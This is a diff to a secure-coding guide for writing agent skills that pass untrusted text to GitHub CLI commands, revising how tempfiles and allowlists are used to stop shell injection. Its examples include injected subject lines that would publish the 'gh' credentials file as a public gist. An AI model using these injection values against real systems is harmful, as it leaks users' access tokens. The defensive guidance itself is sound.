@@ -15,7 +15,7 @@ Use this as a literal checklist when writing a new skill: every
 pattern that applies to the skill's behaviour must be present in
 the SKILL.md body.
 
-## Pattern 1 — Tempfile + `printf '%s'` for attacker-controlled `gh` arguments
+## Pattern 1 — Write tool + `-F field=@file` for attacker-controlled `gh` arguments
 
 Whenever a skill passes an attacker-controlled string (email
 subject, public PR title, scanner finding, reporter-supplied
@@ -25,17 +25,21 @@ single- or double-quoted shell arguments. A subject containing
 
 ```text
 Subject: RCE' --repo attacker/exfil --title 'leaked report
-Subject: x'; cat ~/.config/gh/hosts.yml | gh gist create -; echo '
+Subject: RCE in $(gh gist create ~/.config/gh/hosts.yml --public)
 ```
 
-The fix is to write the string to a tempfile via `printf '%s'`
-(which never triggers shell expansion) and pass the tempfile via
+The only safe path is to keep the attacker bytes out of the
+shell tokeniser entirely. **Use the Write tool** (not Bash) to
+put the string into a tempfile, then pass the tempfile via
 `gh api ... -F field=@/tmp/x.txt`, which reads the value verbatim
 from the file:
 
+*Write tool call:* `file_path: /tmp/issue-title-<n>.txt`,
+`content: <title>`
+
+Then:
 ```bash
 # YES
-printf '%s' "<title>" > /tmp/issue-title-<n>.txt
 gh api repos/<tracker>/issues \
   -F title=@/tmp/issue-title-<n>.txt \
   -F body=@/tmp/issue-body-<n>.md \
@@ -46,6 +50,10 @@ gh api repos/<tracker>/issues -f title='<title>' …
 
 # NO — double-quote inline expands $(...)
 gh api repos/<tracker>/issues -f title="<title>" …
+
+# NO — printf's argument is still in double quotes; the shell
+# expands $(...) before printf runs
+printf '%s' "<title>" > /tmp/issue-title-<n>.txt
 
 # NO — gh issue create has the same problem
 gh issue create --title '<title>' …
@@ -64,17 +72,24 @@ even when the scope is short and the value "looks safe."
 
 When a skill needs to interpolate attacker-controlled text into
 a `gh search` or other shell command that takes a quoted string,
-strip the value to a character allowlist first:
+land the raw value on disk **with the Write tool** (not Bash) per
+Pattern 1, then strip to a character allowlist in the shell:
 
+*Write tool call:* `file_path: /tmp/kw-<n>.txt`,
+`content: <raw keywords>`
+
+Then:
 ```bash
-KEYWORDS=$(printf '%s' "<raw keywords>" | tr -cd 'A-Za-z0-9._ -')
+KEYWORDS=$(tr -cd 'A-Za-z0-9._ -' < /tmp/kw-<n>.txt)
 gh search issues "$KEYWORDS" --repo <tracker> \
   --state open --match title,body
 ```
 
 The post-allowlist string contains no shell metacharacters; the
 loss of precision (collapsed punctuation, dropped accents) only
-affects search recall, never correctness.
+affects search recall, never correctness. Never
+`printf '%s' "<raw keywords>" | tr -cd ...` — the double-quoted
+argument expands `$(...)` before `tr` ever runs.
 
 For inputs that are regex-constrained (e.g. `CVE-\d{4}-\d{4,7}$`,
 `GHSA-[a-z0-9-]{4,}`), regex-validate before interpolation; the
